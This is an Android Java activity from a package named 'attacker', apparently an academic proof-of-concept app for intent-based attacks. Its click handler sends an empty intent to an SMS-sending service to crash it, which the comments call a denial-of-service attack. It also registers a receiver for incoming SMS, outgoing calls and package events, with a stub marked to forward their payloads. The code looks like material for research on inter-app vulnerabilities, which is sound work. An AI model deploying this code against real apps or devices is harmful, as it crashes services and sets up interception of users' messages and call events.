package edu.uci.seal.attacker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

public class MainActivity extends AppCompatActivity implements View.OnClickListener{

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        ((Button) findViewById(R.id.dosBtn)).setOnClickListener(this);

    }

    @Override
    public void onClick(View v) {
        //DOS attack
        Intent intent = new Intent();
        intent.setAction("edu.uci.seal.action.SEND_SMS");
        //no extra data provided which causes the service to throw a NullPointerException
        startService(intent);

    }

    public BroadcastReceiver dynamicReceiver(){
        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                //forward the action and the intent's payload
            }
        };
        IntentFilter iFilter = new IntentFilter();
        iFilter.addAction("android.intent.action.BATTERY_LOW");
        iFilter.addAction("android.intent.action.ACTION_POWER_CONNECTED");
        iFilter.addAction("android.intent.action.PACKAGE_ADDED");
        iFilter.addAction("android.intent.action.PACKAGE_REMOVED");
        iFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");
        iFilter.addAction("android.intent.action.SCREEN_OFF");
        iFilter.addAction("android.intent.action.SCREEN_ON");
        iFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        iFilter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
        registerReceiver(receiver, iFilter);
        return receiver;
    }
}
